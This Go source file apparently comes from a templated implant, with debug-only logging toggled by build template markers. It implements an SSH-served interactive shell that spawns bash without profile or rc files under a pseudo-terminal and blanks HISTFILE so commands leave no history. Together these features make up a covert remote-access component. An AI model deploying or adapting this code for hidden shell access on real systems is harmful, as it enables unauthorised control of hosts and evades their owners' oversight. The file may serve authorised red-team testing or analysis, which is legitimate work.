//go:build !windows
// +build !windows

package sshd

import (
	"fmt"
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}
	"os"
	"os/exec"

	"github.com/creack/pty"
	"golang.org/x/crypto/ssh"
)

type Shell struct {
	ptyFile *os.File
	width   int
	height  int
}

func NewShell() *Shell {
	return &Shell{
		ptyFile: nil,
		width:   80,
		height:  24,
	}
}

func (s *Shell) SetSize(width, height int) {
	s.width = width
	s.height = height
	if s.ptyFile != nil {
		err := pty.Setsize(s.ptyFile, &pty.Winsize{
			Cols: uint16(width),
			Rows: uint16(height),
		})
		if err != nil {
			// {{if .Debug}}
			log.Printf("Failed to set pty size: %v", err)
			// {{end}}
		}
	}
}

func (s *Shell) handleShell(channel ssh.Channel) {
	defer channel.Close()

	var shell *exec.Cmd
	if _, err := os.Stat("/bin/bash"); err == nil {
		shell = exec.Command("/bin/bash", "--noprofile", "--norc")
	} else {
		shell = exec.Command("/bin/sh")
	}

	if shell == nil {
		// {{if .Debug}}
		log.Printf("Shell binary not found")
		// {{end}}
		fmt.Fprintf(channel, "Shell binary not found\n")
		return
	}
	shell.Env = append(shell.Env, "HISTFILE=")

	var err error
	s.ptyFile, err = pty.Start(shell)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to start shell: %v", err)
		// {{end}}
		fmt.Fprintf(channel, "Failed to start shell: %v\n", err)
		return
	}
	defer s.ptyFile.Close()

	s.SetSize(s.width, s.height)

	go io.Copy(s.ptyFile, channel)
	go io.Copy(channel, s.ptyFile)

	if err := shell.Wait(); err != nil {
		// {{if .Debug}}
		log.Printf("Shell exited with error: %v", err)
		// {{end}}
	}
}
